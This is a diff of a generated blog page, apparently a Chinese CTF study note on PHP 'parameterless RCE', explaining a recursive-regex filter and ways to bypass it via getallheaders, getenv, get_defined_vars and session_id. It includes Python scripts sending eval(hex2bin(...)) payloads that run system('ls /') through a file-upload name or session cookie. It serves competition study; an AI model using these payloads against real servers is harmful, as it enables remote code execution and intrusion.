@@ -242,28 +242,6 @@
           
           
           <li>
-            <a href="/tags/">
-              
-              标签
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/archive/">
-              
-              归档
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
             <a href="/categories/">
               
               分类
@@ -275,9 +253,31 @@
           
           
           <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
             <a href="/about/">
               
               关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              归档
               
               
             </a>
@@ -401,7 +401,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">689</span> In Total
+              Words <span class="post-count">691</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -463,17 +463,25 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>某天做题，发现了一个没看懂的 <strong>正则表达式</strong></p>
+        <h2 id="发现">发现</h2>
+<p>某天做题，发现了一个没看懂的 <strong>正则表达式</strong></p>
 <blockquote>
-<p><code>[^\W]+\((?R)?\)</code><br>？？？什么东西</p>
+<p><code>[^\W]+\((?R)?\)</code><br>
+？？？什么东西</p>
 </blockquote>
-<p>尝试在线正则匹配也没弄明白，直接搜表达式吧…<br><img src="rce1.png" alt="rce"><br><img src="rce2.png" alt="rce"><br>收获新名词</p>
+<p>尝试在线正则匹配也没弄明白，直接搜表达式吧…<br>
+<img src="rce1.png" alt="rce"><br>
+<img src="rce2.png" alt="rce"><br>
+收获新名词</p>
 <blockquote>
 <p>无参数 RCE</p>
 </blockquote>
-<p>当时直接用了现成的 payload，现在总结一下 <del>抄网上的东西，方便断网比赛用</del></p>
-<h2 id="新知识"><a href="#新知识" class="headerlink" title="新知识"></a>新知识</h2><h3 id="为什么无参数"><a href="#为什么无参数" class="headerlink" title="为什么无参数"></a>为什么无参数</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/regexp.reference.recursive.php">https://www.php.net/manual/zh/regexp.reference.recursive.php</a><br><img src="rce3.png" alt="rce"></p>
+<p>当时直接用了现成的 payload，现在总结一下 <s>抄网上的东西，方便断网比赛用</s></p>
+<h2 id="新知识">新知识</h2>
+<h3 id="为什么无参数">为什么无参数</h3>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/regexp.reference.recursive.php">https://www.php.net/manual/zh/regexp.reference.recursive.php</a><br>
+<img src="rce3.png" alt="rce"></p>
 </blockquote>
 <p>把(?R)挖掉得到这个正则，这个正则可以匹配类似这样的字符串：phpinfo() 但是括号里面有一个递归模式，可以理解成可以递归：</p>
 <blockquote>
@@ -488,46 +496,85 @@
 <p>a(‘123’)</p>
 </blockquote>
 <p>(?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))</p>
-<h3 id="无参数函数"><a href="#无参数函数" class="headerlink" title="无参数函数"></a>无参数函数</h3><blockquote>
-<p>end() - 将内部指针指向数组中的最后一个元素，并输出。<br>next() - 将内部指针指向数组中的下一个元素，并输出。<br>prev() - 将内部指针指向数组中的上一个元素，并输出。<br>reset() - 将内部指针指向数组中的第一个元素，并输出。<br>each() - 返回当前元素的键名和键值，并将内部指针向前移动。<br>readfile() - 读取文件<br>getcwd() - 获取当前目录<br>localeconv() - 当前目录<br>scandir() - 目录遍历<br>dirname() - 获取上层目录的名字（类似向上级目录移动<br>chdir() - 修改当前目录位置<br>array_flip() - 交换 键 和 值 的内容<br>array_rand() - 随机返回一个 键，可配合 array_flip() 爆破出数组的值<br>array_reverse() - 反向数组<br>show_source 和 highlight_flie - 读文件</p>
+<h3 id="无参数函数">无参数函数</h3>
+<blockquote>
+<p>end() - 将内部指针指向数组中的最后一个元素，并输出。<br>
+next() - 将内部指针指向数组中的下一个元素，并输出。<br>
+prev() - 将内部指针指向数组中的上一个元素，并输出。<br>
+reset() - 将内部指针指向数组中的第一个元素，并输出。<br>
+each() - 返回当前元素的键名和键值，并将内部指针向前移动。<br>
+readfile() - 读取文件<br>
+getcwd() - 获取当前目录<br>
+localeconv() - 当前目录<br>
+scandir() - 目录遍历<br>
+dirname() - 获取上层目录的名字（类似向上级目录移动<br>
+chdir() - 修改当前目录位置<br>
+array_flip() - 交换 键 和 值 的内容<br>
+array_rand() - 随机返回一个 键，可配合 array_flip() 爆破出数组的值<br>
+array_reverse() - 反向数组<br>
+show_source 和 highlight_flie - 读文件</p>
 </blockquote>
-<h3 id="常见的三种方法"><a href="#常见的三种方法" class="headerlink" title="常见的三种方法"></a>常见的三种方法</h3><blockquote>
-<p>gettallheaders（）<br>get_defined_vars()<br>session_id()</p>
+<h3 id="常见的三种方法">常见的三种方法</h3>
+<blockquote>
+<p>gettallheaders（）<br>
+get_defined_vars()<br>
+ session_id()</p>
 </blockquote>
 <ol>
-<li>getallheaders()<blockquote>
-<p>但是只能在 apache2 的环境<br><img src="rce4.png" alt="rce"></p>
-</blockquote>
-</li>
+<li>getallheaders()</li>
 </ol>
-<p>我们可以在 header 中加入恶意命令<br><img src="rce5.png" alt="rce"></p>
 <blockquote>
-<p>var_dump(pos(getallheaders()));<br><img src="rce6.png" alt="rce"></p>
+<p>但是只能在 apache2 的环境<br>
+<img src="rce4.png" alt="rce"></p>
 </blockquote>
-<ol>
-<li><p>getenv()</p>
+<p>我们可以在 header 中加入恶意命令<br>
+<img src="rce5.png" alt="rce"></p>
 <blockquote>
-<p>可以获取当前的环境变量，配合 array_rand(array_flip()) 爆破<br><img src="rce7.png" alt="rce"><br><img src="rce8.png" alt="rce"><br><img src="rce9.png" alt="rce"></p>
+<p>var_dump(pos(getallheaders()));<br>
+<img src="rce6.png" alt="rce"></p>
 </blockquote>
-</li>
-<li><p>get_defined_vars()</p>
+<ol start="2">
+<li>getenv()</li>
+</ol>
 <blockquote>
-<p>局限性小于 getallheaders()，可以获取 $_GET $_POST $_COOKIE $_FILE<br>但一般网站喜欢对 $_GET $_POST $_COOKIE 进行过滤，可以操作 $_FILE<br><img src="rce10.png" alt="rce"><br><img src="rce11.png" alt="rce"><br>python2</p>
+<p>可以获取当前的环境变量，配合 array_rand(array_flip()) 爆破<br>
+<img src="rce7.png" alt="rce"><br>
+<img src="rce8.png" alt="rce"><br>
+<img src="rce9.png" alt="rce"></p>
+</blockquote>
+<ol start="3">
+<li>get_defined_vars()</li>
+</ol>
+<blockquote>
+<p>局限性小于 getallheaders()，可以获取 $_GET $_POST $_COOKIE $_FILE<br>
+但一般网站喜欢对 $_GET $_POST $_COOKIE 进行过滤，可以操作 $_FILE<br>
+<img src="rce10.png" alt="rce"><br>
+<img src="rce11.png" alt="rce"><br>
+python2</p>
+</blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">files = &#123;</span><br><span class="line">    payload: BytesIO(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span> files</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://xxx:xxx/?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
-</blockquote>
-</li>
-<li><p>session_id()</p>
-<blockquote>
-<p>修改 COOKIE　中　PHPSESSION 的值，（测试的时候用不了<br><img src="rce12.png" alt="rce"><br><code>session_start(): Cannot start session when headers already sent in</code><br>python2</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://xxx:xx/?code=eval(hex2bin(session_id(session_start())));&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
-</blockquote>
-</li>
-<li><p>直接读取文件</p>
-<blockquote>
-<p>getcwd() - 获取当前目录<br>scandir() - 目录遍历<br>dirname() - 获取上层目录的名字（类似向上级目录移动<br>chdir() - 修改当前目录位置<br><img src="rce13.png" alt="rce"><br>配合随机弹出值<br><img src="rce14.png" alt="rce"></p>
-</blockquote>
-</li>
+<ol start="4">
+<li>session_id()</li>
 </ol>
+<blockquote>
+<p>修改 COOKIE　中　PHPSESSION 的值，（测试的时候用不了<br>
+<img src="rce12.png" alt="rce"><br>
+<code>session_start(): Cannot start session when headers already sent in</code><br>
+python2</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://xxx:xx/?code=eval(hex2bin(session_id(session_start())));&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>直接读取文件</li>
+</ol>
+<blockquote>
+<p>getcwd() - 获取当前目录<br>
+scandir() - 目录遍历<br>
+dirname() - 获取上层目录的名字（类似向上级目录移动<br>
+chdir() - 修改当前目录位置<br>
+<img src="rce13.png" alt="rce"><br>
+配合随机弹出值<br>
+<img src="rce14.png" alt="rce"></p>
+</blockquote>
 
 
         <hr>
